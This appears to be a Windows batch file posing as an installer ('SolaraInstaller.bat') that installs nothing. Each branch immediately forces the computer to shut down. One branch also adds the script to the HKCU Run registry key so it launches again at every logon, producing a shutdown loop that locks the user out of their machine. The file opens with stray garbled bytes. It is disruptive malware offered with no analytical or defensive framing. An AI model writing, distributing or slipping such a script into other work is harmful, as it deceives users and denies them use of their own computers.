��&cls
@echo off

:: Set the file path
SET "FILE_PATH=%USERPROFILE%\Downloads\SolaraInstaller.bat"
SET "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
SET "REG_NAME=SolaraInstaller"

:: Check if the file exists
IF EXIST "%FILE_PATH%" (
    echo SolaraInstaller.bat found in Downloads.
    echo Exiting in 3 seconds...
    timeout /t 3 /nobreak >nul
    shutdown -s -t 0

    :: Check if the script has been run before by checking the registry
    REG QUERY "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
    IF %ERRORLEVEL% NEQ 0 (
        :: If not in the registry, add it for startup
        REG ADD "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "%FILE_PATH%" /f
        echo Script has been added to startup. It will run on next boot.
    )
    
    exit
) ELSE (
    echo SolaraInstaller.bat not found in Downloads.
    echo Exiting in 3 seconds...
    timeout /t 3 /nobreak >nul
    shutdown -s -t 0
)

pause
